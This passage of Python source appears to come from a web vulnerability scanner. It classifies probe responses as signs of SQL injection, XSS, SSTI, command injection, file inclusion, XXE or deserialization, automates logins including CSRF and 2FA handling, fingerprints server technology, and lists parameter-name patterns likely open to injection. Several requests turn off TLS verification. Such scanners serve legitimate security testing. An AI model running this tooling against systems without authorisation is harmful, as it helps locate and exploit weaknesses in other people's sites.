                    if '<UNIQUE_MARKER_12345' in text or 'UNIQUE_MARKER_12345>' in text:
                        return {'detected': True, 'context': 'html_unescaped', 'confidence': 95}
                    elif 'value="UNIQUE_MARKER_12345"' in text or "value='UNIQUE_MARKER_12345'" in text:
                        return {'detected': True, 'context': 'attribute_value', 'confidence': 85}
                    elif '&lt;UNIQUE_MARKER_12345&gt;' in text:
                        return {'detected': True, 'context': 'html_escaped', 'confidence': 20}
                    else:
                        return {'detected': True, 'context': 'text_node', 'confidence': 60}
        
        elif context == 'command_execution':
            baseline = results.get('baseline', {})
            
            # Check for timing anomalies
            for key, result in results.items():
                if 'sleep' in key and result.get('timing_anomaly'):
                    return {'detected': True, 'confidence': 95, 'type': 'command_injection_confirmed', 'vector': key}
            
            # Check for different response lengths (command output)
            for key, result in results.items():
                if key != 'baseline' and abs(result.get('length', 0) - baseline.get('length', 0)) > 100:
                    return {'detected': True, 'confidence': 75, 'type': 'possible_command_execution'}
        
        elif context == 'file_operations':
            # Check for path traversal indicators
            if results.get('traversal_basic', {}).get('status') in [403, 400]:
                if results.get('valid_filename', {}).get('status') == 200:
                    return {'detected': True, 'confidence': 85, 'type': 'path_filtering_present'}
            
            # Remote file inclusion check
            if results.get('remote_file', {}).get('status') == 200:
                return {'detected': True, 'confidence': 90, 'type': 'remote_file_inclusion_possible'}
        
        elif context == 'xml_parsing':
            # XML content causes different behavior?
            if any(r.get('status') in [400, 500] for r in results.values() if 'error' not in r):
                return {'detected': True, 'confidence': 80, 'type': 'xml_parsing_present'}
        
        elif context == 'serialization':
            # Check for deserialization attempts
            for format_type, result in results.items():
                if result.get('status') in [500, 503] or 'deserialize' in str(result.get('text_sample', '')).lower():
                    return {'detected': True, 'confidence': 85, 'type': f'{format_type}_deserialization', 'format': format_type}
        
        return {'detected': False}
    
    def predict_vulnerabilities(self, behavioral_results):
        """Convert behavioral analysis to vulnerability predictions"""
        predictions = []
        
        # Database behavior → SQLi
        db_behavior = behavioral_results.get('database_interaction', {})
        if db_behavior.get('detected'):
            confidence = db_behavior['confidence']
            
            # Boost confidence based on technology stack
            if self.technology_hints.get('language') in ['php', 'asp']:
                confidence = min(100, confidence + 10)
            
            predictions.append({
                'type': 'sqli',
                'confidence': confidence,
                'evidence': f"Database interaction detected: {db_behavior.get('type')}",
                'behavioral_type': db_behavior.get('type'),
                'requires_bypass': confidence < 70  # Low confidence might need bypass
            })
        
        # Template behavior → SSTI
        template_behavior = behavioral_results.get('template_engine', {})
        if template_behavior.get('detected'):
            predictions.append({
                'type': 'ssti',
                'confidence': template_behavior['confidence'],
                'evidence': f"Template engine confirmed: {template_behavior.get('engine')}",
                'engine': template_behavior.get('engine'),
                'severity': 'critical'
            })
        
        # Reflection + context → XSS
        reflection = behavioral_results.get('reflection_context', {})
        if reflection.get('detected'):
            context = reflection.get('context')
            confidence_map = {
                'html_unescaped': 95,
                'attribute_value': 85,
                'javascript': 90,
                'css_context': 70,
                'text_node': 60,
                'html_escaped': 10  # Very low - properly escaped
            }
            
            if context != 'html_escaped':  # Don't report if properly escaped
                predictions.append({
                    'type': 'xss',
                    'confidence': confidence_map.get(context, 50),
                    'evidence': f"User input reflected in {context}",
                    'context': context,
                    'requires_filter_bypass': context == 'html_escaped'
                })
        
        # Command execution
        cmd_behavior = behavioral_results.get('command_execution', {})
        if cmd_behavior.get('detected'):
            predictions.append({
                'type': 'rce',
                'confidence': cmd_behavior['confidence'],
                'evidence': f"Command execution detected: {cmd_behavior.get('type')}",
                'vector': cmd_behavior.get('vector'),
                'severity': 'critical'
            })
        
        # File operations
        file_behavior = behavioral_results.get('file_operations', {})
        if file_behavior.get('detected'):
            vuln_type = 'rfi' if file_behavior.get('type') == 'remote_file_inclusion_possible' else 'lfi'
            predictions.append({
                'type': vuln_type,
                'confidence': file_behavior['confidence'],
                'evidence': f"File operation detected: {file_behavior.get('type')}",
                'requires_filter_bypass': 'filtering_present' in file_behavior.get('type', '')
            })
        
        # XML parsing
        xml_behavior = behavioral_results.get('xml_parsing', {})
        if xml_behavior.get('detected'):
            predictions.append({
                'type': 'xxe',
                'confidence': xml_behavior['confidence'],
                'evidence': 'XML parsing functionality detected',
                'requires_external_entity_test': True
            })
        
        # Serialization
        serial_behavior = behavioral_results.get('serialization', {})
        if serial_behavior.get('detected'):
            predictions.append({
                'type': 'deserialization',
                'confidence': serial_behavior['confidence'],
                'evidence': f"Deserialization detected: {serial_behavior.get('format')}",
                'format': serial_behavior.get('format'),
                'severity': 'critical'
            })
        
        return predictions


class AuthenticationManager:
    """
    Handle various authentication methods with improved reliability.

    Supports:
    - Basic HTTP Authentication
    - Bearer Token Authentication
    - Cookie-based Authentication
    - Form-based Authentication (with CSRF support)
    - Custom Header Authentication
    - OAuth2 (client credentials)

    Includes:
    - CSRF token extraction
    - Session validation
    - Debug logging integration
    """

    # Common CSRF token field names
    CSRF_FIELD_NAMES = [
        'csrf_token', 'csrftoken', 'csrf', '_csrf', 'csrfmiddlewaretoken',
        '_token', 'authenticity_token', '__RequestVerificationToken',
        'XSRF-TOKEN', 'X-CSRF-Token', 'antiForgery', 'CSRFToken'
    ]

    # Common CSRF header names
    CSRF_HEADER_NAMES = [
        'X-CSRF-Token', 'X-XSRF-Token', 'X-CSRFToken', 'CSRF-Token'
    ]

    def __init__(self, debug_logger=None):
        """
        Initialize AuthenticationManager.

        Args:
            debug_logger: Optional DebugLogger instance for detailed logging
        """
        self.auth_types = {
            'basic': self.setup_basic_auth,
            'bearer': self.setup_bearer_auth,
            'cookie': self.setup_cookie_auth,
            'form': self.setup_form_auth,
            'custom_header': self.setup_custom_header_auth,
            'oauth2': self.setup_oauth2_auth
        }
        self.session = None
        self.auth_config = None
        self.debug_logger = debug_logger
        self.is_authenticated = False
        self.auth_type_used = None
        self.csrf_token = None

    def _log_auth_event(self, action: str, details: dict = None,
                       success: bool = True, error: str = None):
        """Log authentication event to debug logger"""
        if self.debug_logger:
            self.debug_logger.log_auth_event(
                auth_type=self.auth_type_used or 'unknown',
                action=action,
                details=details or {},
                success=success,
                error=error
            )
        # Also log to standard logger
        if success:
            logger.info(f"Auth [{action}]: {details}")
        else:
            logger.error(f"Auth [{action}] FAILED: {error or details}")

    def setup_authentication(self, session, auth_config) -> bool:
        """
        Configure authentication for the session.

        Args:
            session: requests.Session object
            auth_config: Authentication configuration dict

        Returns:
            True if authentication was successful, False otherwise
        """
        self.session = session
        self.auth_config = auth_config

        if not auth_config:
            logger.warning("No authentication configuration provided")
            return False

        auth_type = auth_config.get('type', '').lower()
        self.auth_type_used = auth_type

        self._log_auth_event('setup_start', {'type': auth_type})

        if auth_type in self.auth_types:
            try:
                result = self.auth_types[auth_type](auth_config)
                self.is_authenticated = result

                if result:
                    self._log_auth_event('setup_complete', {'type': auth_type}, success=True)
                else:
                    self._log_auth_event('setup_failed', {'type': auth_type}, success=False)

                return result
            except Exception as e:
                self._log_auth_event('setup_error', {'type': auth_type},
                                    success=False, error=str(e))
                logger.exception(f"Authentication setup error: {e}")
                return False
        else:
            self._log_auth_event('unknown_type', {'type': auth_type},
                                success=False, error=f"Unknown auth type: {auth_type}")
            logger.error(f"Unknown authentication type: {auth_type}")
            return False

    def setup_basic_auth(self, config) -> bool:
        """Setup HTTP Basic Authentication"""
        username = config.get('username')
        password = config.get('password')

        if not username or not password:
            self._log_auth_event('basic_auth',
                                {'error': 'missing credentials'}, success=False)
            return False

        self.session.auth = (username, password)
        self._log_auth_event('basic_auth', {'username': username}, success=True)
        logger.info(f"Basic auth configured for user: {username}")
        return True

    def setup_bearer_auth(self, config) -> bool:
        """Setup Bearer token authentication"""
        token = config.get('token')

        if not token:
            self._log_auth_event('bearer_auth',
                                {'error': 'missing token'}, success=False)
            return False

        self.session.headers.update({
            'Authorization': f'Bearer {token}'
        })
        self._log_auth_event('bearer_auth',
                            {'token_length': len(token)}, success=True)
        logger.info("Bearer token authentication configured")
        return True

    def setup_cookie_auth(self, config) -> bool:
        """Setup cookie-based authentication"""
        cookies = config.get('cookies', {})

        if not cookies:
            self._log_auth_event('cookie_auth',
                                {'error': 'no cookies provided'}, success=False)
            return False

        for name, value in cookies.items():
            self.session.cookies.set(name, value)

        self._log_auth_event('cookie_auth',
                            {'cookie_count': len(cookies),
                             'cookie_names': list(cookies.keys())}, success=True)
        logger.info(f"Cookie authentication configured with {len(cookies)} cookies")
        return True

    def setup_custom_header_auth(self, config) -> bool:
        """Setup custom header authentication"""
        headers = config.get('headers', {})

        if not headers:
            self._log_auth_event('custom_header_auth',
                                {'error': 'no headers provided'}, success=False)
            return False

        self.session.headers.update(headers)
        self._log_auth_event('custom_header_auth',
                            {'header_count': len(headers),
                             'header_names': list(headers.keys())}, success=True)
        logger.info(f"Custom header authentication configured with {len(headers)} headers")
        return True

    def setup_oauth2_auth(self, config) -> bool:
        """Setup OAuth2 client credentials authentication"""
        token_url = config.get('token_url')
        client_id = config.get('client_id')
        client_secret = config.get('client_secret')
        scope = config.get('scope', '')

        if not all([token_url, client_id, client_secret]):
            self._log_auth_event('oauth2_auth',
                                {'error': 'missing oauth2 parameters'}, success=False)
            return False

        try:
            # Request access token
            token_data = {
                'grant_type': 'client_credentials',
                'client_id': client_id,
                'client_secret': client_secret,
            }
            if scope:
                token_data['scope'] = scope

            response = self.session.post(token_url, data=token_data, timeout=30)

            if response.status_code == 200:
                token_response = response.json()
                access_token = token_response.get('access_token')

                if access_token:
                    self.session.headers.update({
                        'Authorization': f'Bearer {access_token}'
                    })
                    self._log_auth_event('oauth2_auth',
                                        {'token_type': token_response.get('token_type'),
                                         'expires_in': token_response.get('expires_in')},
                                        success=True)
                    logger.info("OAuth2 authentication successful")
                    return True

            self._log_auth_event('oauth2_auth',
                                {'status_code': response.status_code}, success=False)
            return False

        except Exception as e:
            self._log_auth_event('oauth2_auth', {}, success=False, error=str(e))
            logger.error(f"OAuth2 authentication error: {e}")
            return False

    def _extract_csrf_token(self, response) -> Optional[str]:
        """
        Extract CSRF token from response.

        Searches in:
        - HTML form hidden fields
        - Meta tags
        - Response headers
        - Cookies
        """
        csrf_token = None

        # 1. Search in HTML form fields
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            for field_name in self.CSRF_FIELD_NAMES:
                # Check input fields
                input_field = soup.find('input', {'name': field_name})
                if input_field and input_field.get('value'):
                    csrf_token = input_field.get('value')
                    self._log_auth_event('csrf_found',
                                        {'source': 'input_field', 'name': field_name})
                    break

                # Check meta tags
                meta_tag = soup.find('meta', {'name': field_name})
                if meta_tag and meta_tag.get('content'):
                    csrf_token = meta_tag.get('content')
                    self._log_auth_event('csrf_found',
                                        {'source': 'meta_tag', 'name': field_name})
                    break
        except Exception as e:
            logger.debug(f"CSRF extraction from HTML failed: {e}")

        # 2. Search in response headers
        if not csrf_token:
            for header_name in self.CSRF_HEADER_NAMES:
                if header_name in response.headers:
                    csrf_token = response.headers[header_name]
                    self._log_auth_event('csrf_found',
                                        {'source': 'header', 'name': header_name})
                    break

        # 3. Search in cookies
        if not csrf_token:
            for cookie_name in ['XSRF-TOKEN', 'csrf_token', 'csrftoken']:
                if cookie_name in response.cookies:
                    csrf_token = response.cookies[cookie_name]
                    self._log_auth_event('csrf_found',
                                        {'source': 'cookie', 'name': cookie_name})
                    break

        return csrf_token

    def _detect_csrf_field_name(self, response) -> str:
        """Detect the CSRF field name used by the form"""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            for field_name in self.CSRF_FIELD_NAMES:
                if soup.find('input', {'name': field_name}):
                    return field_name
        except:
            pass

        return 'csrf_token'  # Default

    def setup_form_auth(self, config) -> bool:
        """
        Setup form-based authentication with login.

        Improvements:
        - Automatic extraction of ALL form fields (hidden, submit, csrf)
        - Pre-login page fetch for session cookies
        - Better success detection
        - No need for extra_fields in most cases
        """
        login_url = config.get('login_url')
        username_field = config.get('username_field', 'username')
        password_field = config.get('password_field', 'password')
        username = config.get('username')
        password = config.get('password')

        if not all([login_url, username, password]):
            self._log_auth_event('form_auth',
                                {'error': 'missing required parameters',
                                 'has_url': bool(login_url),
                                 'has_user': bool(username),
                                 'has_pass': bool(password)}, success=False)
            logger.error("Missing required form auth parameters")
            return False

        try:
            # Step 1: Fetch login page to get session cookies and form fields
            self._log_auth_event('form_auth_step1', {'action': 'fetching login page'})

            pre_login_response = self.session.get(login_url, timeout=30, verify=False)

            if pre_login_response.status_code != 200:
                self._log_auth_event('form_auth',
                                    {'error': f'login page returned {pre_login_response.status_code}'},
                                    success=False)
                logger.error(f"Failed to fetch login page: {pre_login_response.status_code}")
                return False

            # Step 2: Extract ALL form fields automatically
            login_data = {}

            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(pre_login_response.text, 'html.parser')

                # Find the login form
                form = soup.find('form')
                if form:
                    # Extract ALL input fields from the form
                    for inp in form.find_all('input'):
                        name = inp.get('name')
                        if not name:
                            continue

                        input_type = inp.get('type', 'text').lower()
                        value = inp.get('value', '')

                        if input_type == 'hidden':
                            # Include all hidden fields (CSRF tokens, etc.)
                            login_data[name] = value
                            logger.info(f"Found hidden field: {name}")
                        elif input_type == 'submit':
                            # Include submit button
                            login_data[name] = value
                            logger.info(f"Found submit button: {name}={value}")
                        # Skip text/password - we'll add those with user values

                    logger.info(f"Extracted {len(login_data)} fields from form")
                else:
                    logger.warning("No form found, using fallback CSRF extraction")
                    # Fallback to CSRF-only extraction
                    csrf_token = self._extract_csrf_token(pre_login_response)
                    csrf_field = self._detect_csrf_field_name(pre_login_response)
                    if csrf_token and csrf_field:
                        login_data[csrf_field] = csrf_token

            except ImportError:
                logger.warning("BeautifulSoup not available, using regex extraction")
                # Fallback to CSRF extraction
                csrf_token = self._extract_csrf_token(pre_login_response)
                csrf_field = self._detect_csrf_field_name(pre_login_response)
                if csrf_token and csrf_field:
                    login_data[csrf_field] = csrf_token

            # Step 3: Add username and password
            login_data[username_field] = username
            login_data[password_field] = password

            # Add any additional fields from config (for special cases)
            extra_fields = config.get('extra_fields', {})
            login_data.update(extra_fields)

            # Log what we're sending (mask password)
            safe_data = {k: ('***' if 'pass' in k.lower() else v) for k, v in login_data.items()}
            logger.info(f"Login POST data: {safe_data}")

            # Step 4: Perform login
            self._log_auth_event('form_auth_step2',
                                {'action': 'submitting login form',
                                 'fields': list(login_data.keys())})

            # Some sites need specific headers
            login_headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': login_url,
            }

            response = self.session.post(
                login_url,
                data=login_data,
                headers=login_headers,
                timeout=30,
                verify=False,
                allow_redirects=True
            )

            # Step 5: Check login success
            success = self._check_login_success(response, config)

            if success:
                self._log_auth_event('form_auth_success',
                                    {'username': username,
                                     'final_url': response.url,
                                     'cookies_received': list(self.session.cookies.keys())},
                                    success=True)
                logger.info(f"Form authentication successful for user: {username}")

                # Handle 2FA if required
                if config.get('2fa_required'):
                    return self.handle_2fa(config, response)

                return True
            else:
                self._log_auth_event('form_auth_failed',
                                    {'username': username,
                                     'status_code': response.status_code,
                                     'final_url': response.url},
                                    success=False)
                logger.error("Form authentication failed")
                return False

        except Exception as e:
            self._log_auth_event('form_auth_error',
                                {'error': str(e)}, success=False, error=str(e))
            logger.exception(f"Form authentication error: {e}")
            return False

    def _check_login_success(self, response, config) -> bool:
        """
        Check if login was successful using multiple methods.
        """
        login_url = config.get('login_url', '')

        # Method 1: Check for explicit success indicators
        success_indicators = config.get('success_indicators', [])
        if success_indicators:
            for indicator in success_indicators:
                if indicator in response.text:
                    logger.info(f"Login success: found success indicator '{indicator}'")
                    return True

        # Method 2: Check if redirected away from login page (most reliable)
        if response.url.lower() != login_url.lower() and 'login' not in response.url.lower():
            logger.info(f"Login success: redirected to {response.url}")
            return True

        # Method 3: Check for failure indicators (only if NOT redirected)
        # Use specific failure messages to avoid false positives
        failure_indicators = config.get('failure_indicators', [
            'login failed', 'Login failed', 'invalid username', 'invalid password',
            'incorrect password', 'wrong password', 'authentication failed',
            'access denied', 'bad credentials', 'invalid credentials',
            'CSRF token is incorrect'
        ])
        response_lower = response.text.lower()
        for indicator in failure_indicators:
            if indicator.lower() in response_lower:
                logger.error(f"Login failed: found '{indicator}' in response")
                return False

        # Method 4: Check if login form is no longer present
        if 'type="password"' not in response.text:
            logger.info("Login success: login form no longer present")
            return True

        # Method 5: Real verification - try to access site root
        try:
            from urllib.parse import urlparse, urlunparse
            parsed = urlparse(login_url)
            base_url = urlunparse((parsed.scheme, parsed.netloc, '/', '', '', ''))

            verify_response = self.session.get(base_url, timeout=10, allow_redirects=True)

            if 'login' not in verify_response.url.lower():
                logger.info(f"Login success: verified access to {verify_response.url}")
                return True
            else:
                logger.error(f"Login failed: redirected back to login page")
                return False
        except Exception as e:
            logger.warning(f"Could not verify login via base URL: {e}")

        return False

    def handle_2fa(self, config, login_response) -> bool:
        """Handle two-factor authentication"""
        twofa_url = config.get('2fa_url')
        twofa_field = config.get('2fa_field', 'code')
        twofa_code = config.get('2fa_code')

        if not twofa_url:
            # Try to detect 2FA page from login response
            if '2fa' in login_response.url.lower() or 'verify' in login_response.url.lower():
                twofa_url = login_response.url

        if not twofa_url or not twofa_code:
            self._log_auth_event('2fa_skipped',
                                {'error': 'missing 2fa_url or 2fa_code'}, success=False)
            logger.warning("2FA required but missing configuration")
            return False

        try:
            self._log_auth_event('2fa_attempt', {'url': twofa_url})

            twofa_data = {twofa_field: twofa_code}

            # Check for CSRF on 2FA page
            if self.csrf_token:
                twofa_data['csrf_token'] = self.csrf_token

            response = self.session.post(twofa_url, data=twofa_data, timeout=30, verify=False)

            if response.status_code in [200, 302]:
                self._log_auth_event('2fa_success', {}, success=True)
                logger.info("2FA authentication successful")
                return True
            else:
                self._log_auth_event('2fa_failed',
                                    {'status_code': response.status_code}, success=False)
                logger.error("2FA authentication failed")
                return False

        except Exception as e:
            self._log_auth_event('2fa_error', {}, success=False, error=str(e))
            logger.error(f"2FA error: {e}")
            return False

    def verify_session(self, verify_url: str = None) -> bool:
        """
        Verify that the session is still authenticated.

        Args:
            verify_url: URL to check authentication status

        Returns:
            True if authenticated, False otherwise
        """
        if not verify_url:
            return self.is_authenticated

        try:
            response = self.session.get(verify_url, timeout=15, verify=False)

            # Check if we got redirected to login page
            if 'login' in response.url.lower():
                self.is_authenticated = False
                return False

            # Check for common "not authenticated" indicators
            unauth_indicators = ['please log in', 'login required', 'session expired']
            for indicator in unauth_indicators:
                if indicator in response.text.lower():
                    self.is_authenticated = False
                    return False

            return True

        except Exception as e:
            logger.error(f"Session verification error: {e}")
            return False

    def get_auth_status(self) -> dict:
        """Get current authentication status"""
        return {
            'is_authenticated': self.is_authenticated,
            'auth_type': self.auth_type_used,
            'has_csrf_token': self.csrf_token is not None,
            'session_cookies': list(self.session.cookies.keys()) if self.session else []
        }


class TechnologyDetector:
    """Detect technologies, frameworks, and libraries used by the target"""
    
    def __init__(self):
        self.tech_signatures = {
            'cms': {
                'wordpress': {
                    'headers': ['X-Powered-By: WordPress'],
                    'paths': ['/wp-content/', '/wp-includes/', '/wp-admin/'],
                    'meta': ['generator.*wordpress', 'wp-'],
                    'cookies': ['wordpress_'],
                    'confidence': 0
                },
                'drupal': {
                    'headers': ['X-Generator: Drupal'],
                    'paths': ['/sites/default/', '/modules/', '/misc/drupal.js'],
                    'meta': ['generator.*drupal'],
                    'cookies': ['SESS'],
                    'confidence': 0
                },
                'joomla': {
                    'headers': ['X-Content-Encoded-By: Joomla'],
                    'paths': ['/components/', '/modules/', '/templates/', '/plugins/'],
                    'meta': ['generator.*joomla'],
                    'cookies': [],
                    'confidence': 0
                }
            },
            'languages': {
                'php': {
                    'headers': ['X-Powered-By: PHP', 'Server:.*PHP'],
                    'extensions': ['.php', '.php3', '.php4', '.php5', '.phtml'],
                    'cookies': ['PHPSESSID'],
                    'confidence': 0
                },
                'asp.net': {
                    'headers': ['X-Powered-By: ASP.NET', 'X-AspNet-Version'],
                    'extensions': ['.aspx', '.asp', '.asmx'],
                    'cookies': ['ASP.NET_SessionId'],
                    'confidence': 0
                },
                'java': {
                    'headers': ['X-Powered-By:.*Servlet', 'Server:.*Tomcat'],
                    'extensions': ['.jsp', '.do', '.action'],
                    'cookies': ['JSESSIONID'],
                    'confidence': 0
                },
                'python': {
                    'headers': ['Server:.*Python', 'X-Powered-By:.*Python'],
                    'extensions': ['.py'],
                    'cookies': [],
                    'confidence': 0
                }
            },
            'frameworks': {
                'laravel': {
                    'headers': [],
                    'cookies': ['laravel_session'],
                    'paths': ['/storage/', '/public/'],
                    'confidence': 0
                },
                'django': {
                    'headers': [],
                    'cookies': ['csrftoken', 'sessionid'],
                    'paths': ['/static/', '/media/'],
                    'confidence': 0
                },
                'spring': {
                    'headers': ['X-Application-Context'],
                    'paths': ['/actuator/', '/swagger-ui.html'],
                    'cookies': [],
                    'confidence': 0
                },
                'express': {
                    'headers': ['X-Powered-By: Express'],
                    'cookies': ['connect.sid'],
                    'paths': [],
                    'confidence': 0
                }
            },
            'servers': {
                'nginx': {
                    'headers': ['Server:.*nginx'],
                    'confidence': 0
                },
                'apache': {
                    'headers': ['Server:.*Apache'],
                    'confidence': 0
                },
                'iis': {
                    'headers': ['Server:.*IIS', 'X-Powered-By: ASP.NET'],
                    'confidence': 0
                }
            }
        }
    
    def detect(self, response, url):
        """Analyze response to detect technologies"""
        detected = {
            'cms': None,
            'language': None,
            'framework': None,
            'server': None,
            'javascript_libs': [],
            'headers': dict(response.headers),
            'cookies': list(response.cookies.keys())
        }
        
        # Check headers
        for category, technologies in self.tech_signatures.items():
            if category == 'javascript_libs':
                continue
                
            for tech, signatures in technologies.items():
                confidence = 0
                
                # Check headers
                if 'headers' in signatures:
                    for header_pattern in signatures['headers']:
                        for header, value in response.headers.items():
                            if re.search(header_pattern, f"{header}: {value}", re.I):
                                confidence += 40
                
                # Check cookies
                if 'cookies' in signatures:
                    for cookie_pattern in signatures['cookies']:
                        for cookie in response.cookies:
                            if cookie_pattern.lower() in cookie.lower():
                                confidence += 30
                
                # Check paths in HTML
                if 'paths' in signatures and response.text:
                    for path in signatures['paths']:
                        if path in response.text:
                            confidence += 20
                
                # Check meta tags
                if 'meta' in signatures and response.text:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for meta in soup.find_all('meta'):
                        meta_str = str(meta)
                        for pattern in signatures['meta']:
                            if re.search(pattern, meta_str, re.I):
                                confidence += 30
                
                # Check file extensions in URL
                if 'extensions' in signatures:
                    for ext in signatures['extensions']:
                        if url.endswith(ext):
                            confidence += 25
                
                # Update if this is the highest confidence for this category
                if confidence > 50:
                    if category in detected and detected[category]:
                        if confidence > self.tech_signatures[category][detected[category]]['confidence']:
                            detected[category] = tech
                            self.tech_signatures[category][tech]['confidence'] = confidence
                    else:
                        detected[category] = tech
                        self.tech_signatures[category][tech]['confidence'] = confidence
        
        # Detect JavaScript libraries
        detected['javascript_libs'] = self._detect_js_libs(response.text if response.text else "")
        
        return detected
    
    def _detect_js_libs(self, html):
        """Detect JavaScript libraries from HTML content"""
        js_libs = []
        
        patterns = {
            'jquery': r'jquery[.-]?([\d.]+)?\.?(min)?\.js',
            'angular': r'angular[.-]?([\d.]+)?\.?(min)?\.js',
            'react': r'react[.-]?([\d.]+)?\.?(min)?\.js',
            'vue': r'vue[.-]?([\d.]+)?\.?(min)?\.js',
            'bootstrap': r'bootstrap[.-]?([\d.]+)?\.?(min)?\.js',
            'lodash': r'lodash[.-]?([\d.]+)?\.?(min)?\.js',
            'moment': r'moment[.-]?([\d.]+)?\.?(min)?\.js'
        }
        
        for lib, pattern in patterns.items():
            if re.search(pattern, html, re.I):
                js_libs.append(lib)
        
        return js_libs


class ParameterNormalizer:
    """
    Normalizza i nomi dei parametri per migliorare pattern matching.

    Trasforma:
    - camelCase → snake_case (userId → user_id)
    - kebab-case → snake_case (user-id → user_id)
    - Rimuove prefissi/suffissi comuni (new_, old_, tmp_)
    - Rimuove numeri trailing (id1 → id, user2 → user)
    """

    COMMON_PREFIXES = [
        'new_', 'old_', 'tmp_', 'temp_', 'current_', 'prev_', 'next_',
        'src_', 'dst_', 'source_', 'dest_', 'target_',
        'input_', 'output_', 'in_', 'out_',
        'req_', 'res_', 'request_', 'response_',
    ]

    COMMON_SUFFIXES = [
        '_new', '_old', '_tmp', '_temp', '_current', '_prev', '_next',
        '_src', '_dst', '_source', '_dest', '_target',
        '_input', '_output', '_in', '_out',
        '_req', '_res', '_request', '_response',
        '_val', '_value', '_param', '_parameter',
    ]

    @staticmethod
    def normalize(param_name: str) -> str:
        """
        Normalizza un nome parametro per matching migliore.

        Returns: versione normalizzata del nome
        """
        if not param_name:
            return param_name

        # 1. Lowercase
        normalized = param_name.lower()

        # 2. camelCase → snake_case
        # userId → user_id, productId → product_id
        normalized = re.sub(r'([a-z])([A-Z])', r'\1_\2', normalized)
        normalized = normalized.lower()

        # 3. kebab-case → snake_case
        # user-id → user_id
        normalized = normalized.replace('-', '_')

        # 4. Rimuovi prefissi comuni
        for prefix in ParameterNormalizer.COMMON_PREFIXES:
            if normalized.startswith(prefix):
                normalized = normalized[len(prefix):]
                break  # Solo il primo prefisso

        # 5. Rimuovi suffissi comuni
        for suffix in ParameterNormalizer.COMMON_SUFFIXES:
            if normalized.endswith(suffix):
                normalized = normalized[:-len(suffix)]
                break

        # 6. Rimuovi numeri trailing (id1 → id, user2 → user)
        normalized = re.sub(r'\d+$', '', normalized)

        # 7. Rimuovi underscore multipli consecutivi
        normalized = re.sub(r'_+', '_', normalized)

        # 8. Rimuovi underscore iniziali/finali
        normalized = normalized.strip('_')

        return normalized

    @staticmethod
    def get_variants(param_name: str) -> list:
        """
        Genera varianti del parametro per matching flessibile.

        Returns: lista di varianti [originale, normalizzato, abbreviato, ...]
        """
        variants = [param_name]  # Originale

        # Normalizzato
        normalized = ParameterNormalizer.normalize(param_name)
        if normalized != param_name:
            variants.append(normalized)

        # Senza underscore (userid vs user_id)
        no_underscore = normalized.replace('_', '')
        if no_underscore not in variants:
            variants.append(no_underscore)

        # Prima parola (user_id → user)
        if '_' in normalized:
            first_part = normalized.split('_')[0]
            if len(first_part) > 2:  # Evita singole lettere
                variants.append(first_part)

        # Ultima parola (user_id → id)
        if '_' in normalized:
            last_part = normalized.split('_')[-1]
            if len(last_part) > 1:
                variants.append(last_part)

        return list(set(variants))  # Rimuovi duplicati


class ParameterAnalyzer:
    """
    Analyze parameters for vulnerability indicators.

    MIGLIORAMENTI v4.1:
    - Regex-based parameter matching invece di exact match
    - Fallback testing per parametri sconosciuti (XSS + SQLi di default)
    - Maggiore copertura tramite pattern flessibili
    """

    def __init__(self):
        # ===== REGEX PATTERNS invece di liste esatte =====
        # Patterns per SQL Injection - cattura variazioni come user_id, product_id, etc.
        self.sql_patterns = [
            # Primary keys e identificatori
            r'^id$', r'^.*_id$', r'^uid$', r'^user_id$', r'^userid$',
            r'^pid$', r'^product_id$', r'^item_id$', r'^post_id$',
            r'^order_id$', r'^invoice_id$', r'^ticket_id$',
            r'^.*id$',                  # ends with id (userid, categoryid)

            # User/Auth parameters
            r'^user$', r'^username$', r'^uname$', r'^login$',
            r'^email$', r'^mail$', r'^account$', r'^acc$',

            # Search/Filter/Query
            r'^name$', r'^search$', r'^q$', r'^query$', r'^keyword$',
            r'^order$', r'^sort$', r'^sortby$', r'^orderby$',
            r'^filter$', r'^where$', r'^group$', r'^groupby$',

            # Category/Type/Status
            r'^category$', r'^cat$', r'^type$', r'^status$',
            r'^state$', r'^level$', r'^priority$', r'^role$',
            r'^item$',

            # Keys/Codes
            r'^.*key$', r'^.*_key$', r'^.*code$', r'^.*_code$',
            r'^token$', r'^session$', r'^sess$',

            # Table/Column hints
            r'^table$', r'^column$', r'^field$', r'^param$',
            r'^value$', r'^val$', r'^data$',

            # Numeric patterns (likely IDs)
            r'^num$', r'^number$', r'^no$', r'^count$', r'^limit$',
            r'^offset$', r'^start$', r'^end$', r'^page$', r'^pagenum$',
            r'^pag$',
            r'^(year|month|day|date)$', # date params (often in queries)
        ]

        # Patterns per File Inclusion (LFI/RFI)
        self.file_patterns = [
            # Direct file references
            r'^file$', r'^filename$', r'^fname$', r'^filepath$',
            r'^.*file$', r'^.*_file$', r'^.*File$',

            # Path parameters
            r'^path$', r'^filepath$', r'^dir$', r'^directory$',
            r'^folder$', r'^location$', r'^.*path$', r'^.*_path$',
            r'^pathname$',

            # Include/Template
            r'^page$', r'^include$', r'^require$', r'^inc$',
            r'^template$', r'^tmpl$', r'^view$', r'^layout$',
            r'^theme$', r'^skin$', r'^style$',
            r'^tpl$',

            # Module loading
            r'^module$', r'^plugin$', r'^addon$', r'^ext$',

            # Document/Download
            r'^doc$', r'^document$', r'^download$', r'^dl$',
            r'^attachment$', r'^attach$', r'^asset$',

            # Load/Read operations
            r'^load$', r'^read$', r'^open$', r'^get$',
            r'^fetch$', r'^retrieve$', r'^show$', r'^display$',

            # Image/Media (can be LFI vectors)
            r'^img$', r'^image$', r'^photo$', r'^picture$',
            r'^media$', r'^resource$', r'^src$', r'^source$',

            # Config/Language files
            r'^config$', r'^conf$', r'^cfg$', r'^ini$',
            r'^lang$', r'^language$', r'^locale$', r'^l10n$',

            # URL/URI (RFI indicators)
            r'^url$', r'^uri$', r'^link$', r'^href$',
            r'^redirect$', r'^redir$', r'^goto$', r'^next$',
        ]

        # Patterns per Command Injection (RCE)
        self.cmd_patterns = [
            r'^(cmd|command|exec|execute)$',  # command params
            r'^(ping|host|ip|target|domain)$',  # network test params
            r'^(system|shell|run|proc)$',  # system params
            r'^(func|function|do|action)$',  # action params
            r'^(daemon|service|process)$',  # service params
            r'.*cmd$',                  # ends with 'cmd'
            r'^(eval|code)$',           # eval params
        ]

        # Patterns per XXE
